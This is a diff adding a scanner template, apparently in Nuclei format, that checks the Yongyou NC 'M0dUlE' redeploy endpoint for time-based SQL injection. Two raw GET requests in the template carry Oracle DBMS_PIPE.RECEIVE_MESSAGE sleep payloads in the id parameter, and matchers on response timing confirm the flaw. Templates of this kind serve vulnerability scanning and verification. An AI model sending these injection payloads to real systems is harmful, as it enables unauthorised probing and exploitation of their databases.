@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-nc-m0dule-sqli
+info:
+  name: "Yongyou NC M0dUlE 重部署接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: yongyou-nc
+  description: |
+    SQL Injection vulnerability in Yongyou NC M0dUlE that allows attackers to execute arbitrary SQL commands via the redeploy endpoint.
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)--&pageId=login HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,8)--&pageId=login HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CRC"
+          - "ERRORredeploy"
+          - "ok!"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
